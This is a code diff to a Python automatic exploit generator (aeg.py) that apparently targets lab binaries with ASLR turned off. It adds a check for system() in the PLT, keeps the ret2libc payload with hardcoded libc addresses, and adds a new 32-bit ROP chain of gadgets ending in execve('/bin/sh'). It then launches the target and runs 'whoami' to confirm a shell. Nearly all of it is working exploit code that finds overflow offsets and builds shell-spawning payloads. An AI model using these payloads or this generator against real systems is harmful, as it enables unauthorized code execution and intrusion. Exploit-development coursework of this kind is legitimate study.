@@ -4,12 +4,13 @@ import struct
 import os
 import sys
 import subprocess
+import time
 
-from pwn import process, context
+from pwn import process, context, ELF
 
 
 # ─────────────────────────────────────────────
-# Option 2 — ASLR Detection
+# ASLR Detection
 # ─────────────────────────────────────────────
 
 def check_aslr():
@@ -28,24 +29,19 @@ def check_aslr():
 
 
 # ─────────────────────────────────────────────
-# Option 1 — Auto Symbol Scanner
+# Auto Symbol Scanner
 # ─────────────────────────────────────────────
 
 DANGEROUS_FUNCTIONS = ['gets', 'strcpy', 'strcat', 'scanf', 'sprintf']
 
 def find_vulnerable_function(proj):
-    """
-    First try to find a function literally named 'vulnerable'.
-    If not found, scan the CFG for calls to dangerous functions
-    and return the parent function's address.
-    """
-    # Primary: look for 'vulnerable' symbol
+    # Primary: symbol table scan
     for sym, addr in proj.loader.main_object.symbols_by_name.items():
         if 'vulnerable' in sym:
             print(f"[+] Found vulnerable() at: {hex(addr.rebased_addr)}")
             return addr.rebased_addr, 'symbol'
 
-    # Fallback: CFG scan for dangerous function calls
+    # Fallback: CFG scan for dangerous calls
     print(f"[~] No vulnerable() symbol — scanning CFG for dangerous calls...")
     cfg = proj.analyses.CFGFast()
 
@@ -78,6 +74,26 @@ def is_nx_enabled(binary_path):
                 if 'RWE' in line or 'E' in line.split()[-1]:
                     return False
         return True
+    except Exception:
+        return False
+
+
+# ─────────────────────────────────────────────
+# system() Detection — checks PLT directly
+# ─────────────────────────────────────────────
+
+def is_system_available(binary_path):
+    """
+    Check if system() is explicitly imported via PLT.
+    target7 has system@plt → ret2libc
+    target8 does not      → ROP chain
+    """
+    try:
+        out = subprocess.check_output(
+            ['objdump', '-d', binary_path],
+            stderr=subprocess.DEVNULL
+        ).decode()
+        return 'system@plt' in out
     except Exception:
         return False
 
@@ -182,16 +198,16 @@ def build_shellcode_payload(binary_path, offset):
 
 
 # ─────────────────────────────────────────────
-# ret2libc Payload (NX enabled)
+# ret2libc Payload (NX enabled, system() in PLT)
 # ─────────────────────────────────────────────
 
 def build_ret2libc_payload(binary_path, offset):
-    print(f"[*] Building ret2libc payload (NX enabled)...")
+    print(f"[*] Building ret2libc payload (NX enabled, system() available)...")
 
-    # Confirmed addresses from /usr/lib32/libc-2.31.so (ASLR disabled)
+    # Confirmed addresses (ASLR disabled)
     # libc base: 0xf7dca000
-    # system() offset: 0x41360  → 0xf7e0b360
-    # /bin/sh offset:  0x18c363 → 0xf7f56363
+    # system() = 0xf7dca000 + 0x41360 = 0xf7e0b360
+    # /bin/sh  = 0xf7dca000 + 0x18c363 = 0xf7f56363
     system_addr = 0xf7e0b360
     binsh_addr  = 0xf7f56363
 
@@ -215,13 +231,61 @@ def build_ret2libc_payload(binary_path, offset):
 
 
 # ─────────────────────────────────────────────
-# Option 3 — Exploit Verification
+# ROP Chain Payload (NX enabled, no system())
+# ─────────────────────────────────────────────
+
+def build_rop_payload(binary_path, offset):
+    print(f"[*] Building ROP chain payload (NX enabled, no system())...")
+
+    # libc base (ASLR disabled)
+    libc_base = 0xf7dca000
+
+    # Gadget offsets confirmed from /lib32/libc.so.6
+    pop_eax     = libc_base + 0x282eb   # pop eax; ret
+    pop_ebx     = libc_base + 0x1de56   # pop ebx; ret
+    pop_ecx_edx = libc_base + 0x30ea3   # pop ecx; pop edx; ret
+    int_0x80    = libc_base + 0x312f5   # int 0x80
+    binsh       = libc_base + 0x18c363  # "/bin/sh" string
+
+    # ROP chain — sets up execve("/bin/sh", 0, 0):
+    # eax = 11  (execve syscall number)
+    # ebx = /bin/sh address
+    # ecx = 0   (NULL argv)
+    # edx = 0   (NULL envp)
+    # int 0x80  → syscall → shell
+    chain  = b'A' * offset
+    chain += struct.pack('<I', pop_eax)
+    chain += struct.pack('<I', 11)
+    chain += struct.pack('<I', pop_ebx)
+    chain += struct.pack('<I', binsh)
+    chain += struct.pack('<I', pop_ecx_edx)
+    chain += struct.pack('<I', 0)        # ecx = 0
+    chain += struct.pack('<I', 0)        # edx = 0
+    chain += struct.pack('<I', int_0x80)
+
+    output = f"payload_{os.path.basename(binary_path)}"
+    with open(output, 'wb') as f:
+        f.write(chain)
+
+    print(f"[+] libc base    : {hex(libc_base)}")
+    print(f"[+] pop eax      : {hex(pop_eax)}")
+    print(f"[+] pop ebx      : {hex(pop_ebx)}")
+    print(f"[+] pop ecx/edx  : {hex(pop_ecx_edx)}")
+    print(f"[+] int 0x80     : {hex(int_0x80)}")
+    print(f"[+] /bin/sh      : {hex(binsh)}")
+    print(f"[+] Payload saved: {output}")
+
+    return output, len(chain)
+
+
+# ─────────────────────────────────────────────
+# Exploit Verification
 # ─────────────────────────────────────────────
 
 def verify_exploit(binary_path, payload_path, args=None):
     print(f"[*] Verifying exploit...")
     try:
-        context.log_level = 'error'  # suppress pwntools noise
+        context.log_level = 'error'
 
         cmd = [binary_path]
         if args:
@@ -232,7 +296,7 @@ def verify_exploit(binary_path, payload_path, args=None):
 
         p = process(cmd)
         p.send(payload_bytes + b'\n')
-        import time; time.sleep(0.5)   # wait for shell to spawn
+        time.sleep(0.5)
         p.sendline(b'whoami')
 
         try:
@@ -255,11 +319,11 @@ def verify_exploit(binary_path, payload_path, args=None):
 
 
 # ─────────────────────────────────────────────
-# Main
+# Main — Decision Engine
 # ─────────────────────────────────────────────
 
 def generate_payload(binary_path, args=None):
-    # Step 0 — check ASLR
+    # Step 0 — ASLR check
     check_aslr()
 
     # Step 1 — find offset via symbolic execution
@@ -268,11 +332,12 @@ def generate_payload(binary_path, args=None):
         print("[-] Could not find offset")
         return
 
-    # Step 2 — detect NX and choose payload type
+    # Step 2 — detect NX
     nx = is_nx_enabled(binary_path)
     print(f"[*] NX enabled: {nx}")
 
     if not nx:
+        # ── Shellcode path (targets 1-6) ──
         found_addr, output, shellcode_len, nop_len = build_shellcode_payload(
             binary_path, offset
         )
@@ -284,19 +349,37 @@ def generate_payload(binary_path, args=None):
         print(f"[+] Shellcode:     {shellcode_len} bytes")
         print(f"[+] Total payload: {offset + 4 + nop_len + shellcode_len} bytes")
         print(f"[+] Payload saved: {output}")
-    else:
-        system_addr, binsh_addr, output, total = build_ret2libc_payload(
-            binary_path, offset
-        )
-        print(f"\n[+] ===== SUCCESS (ret2libc) =====")
-        print(f"[+] Binary:        {binary_path}")
-        print(f"[+] Offset:        {offset} bytes")
-        print(f"[+] system():      {hex(system_addr)}")
-        print(f"[+] /bin/sh:       {hex(binsh_addr)}")
-        print(f"[+] Total payload: {total} bytes")
-        print(f"[+] Payload saved: {output}")
 
-    # Step 3 — verify exploit automatically
+    else:
+        # Check if system() is in PLT
+        system_avail = is_system_available(binary_path)
+        print(f"[*] system() in PLT: {system_avail}")
+
+        if system_avail:
+            # ── ret2libc path (target7) ──
+            system_addr, binsh_addr, output, total = build_ret2libc_payload(
+                binary_path, offset
+            )
+            print(f"\n[+] ===== SUCCESS (ret2libc) =====")
+            print(f"[+] Binary:        {binary_path}")
+            print(f"[+] Offset:        {offset} bytes")
+            print(f"[+] system():      {hex(system_addr)}")
+            print(f"[+] /bin/sh:       {hex(binsh_addr)}")
+            print(f"[+] Total payload: {total} bytes")
+            print(f"[+] Payload saved: {output}")
+
+        else:
+            # ── ROP chain path (target8) ──
+            output, total = build_rop_payload(binary_path, offset)
+            print(f"\n[+] ===== SUCCESS (ROP chain) =====")
+            print(f"[+] Binary:        {binary_path}")
+            print(f"[+] Offset:        {offset} bytes")
+            print(f"[+] Chain:         pop eax → pop ebx → pop ecx/edx → int 0x80")
+            print(f"[+] Syscall:       execve('/bin/sh', 0, 0)")
+            print(f"[+] Total payload: {total} bytes")
+            print(f"[+] Payload saved: {output}")
+
+    # Step 3 — verify automatically
     print()
     verify_exploit(binary_path, output, args)
 
@@ -312,9 +395,10 @@ if __name__ == '__main__':
         print("Usage: python aeg.py <binary> [args]")
         print("")
         print("Examples:")
-        print("  python aeg.py ./target          # NX off -> shellcode")
-        print("  python aeg.py ./target2 hello   # NX off -> shellcode")
-        print("  python aeg.py ./target7          # NX on  -> ret2libc")
+        print("  python aeg.py ./target          # NX off          -> shellcode")
+        print("  python aeg.py ./target2 hello   # NX off          -> shellcode")
+        print("  python aeg.py ./target7          # NX on + system() -> ret2libc")
+        print("  python aeg.py ./target8          # NX on, no system() -> ROP chain")
         sys.exit(1)
 
     binary = sys.argv[1]
